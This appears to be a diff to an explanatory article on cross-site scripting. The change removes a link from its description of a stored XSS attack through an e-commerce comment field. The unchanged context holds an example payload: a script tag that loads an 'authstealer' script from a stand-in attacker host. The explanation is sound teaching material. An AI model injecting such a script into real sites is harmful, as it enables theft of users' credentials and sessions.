@@ -31,7 +31,7 @@ Cross-site scripting (XSS) is a type of injection attack in which a threat actor
 <br />
 
 ### What are examples of cross-site scripting?
-One example of a stored XSS attack is to [inject malicious code into the comment field](https://www.techtarget.com/whatis/definition/input-validation-attack) of an e-commerce site. An attacker embeds code within a comment, writing "Read my review of this item!" alongside code with a malicious URL embedded. The code might say something like:
+One example of a stored XSS attack is to inject malicious code into the comment field of an e-commerce site. An attacker embeds code within a comment, writing "Read my review of this item!" alongside code with a malicious URL embedded. The code might say something like:
 ```html
 <script src=http://evilhack.com/authstealer.js></script>
 ```
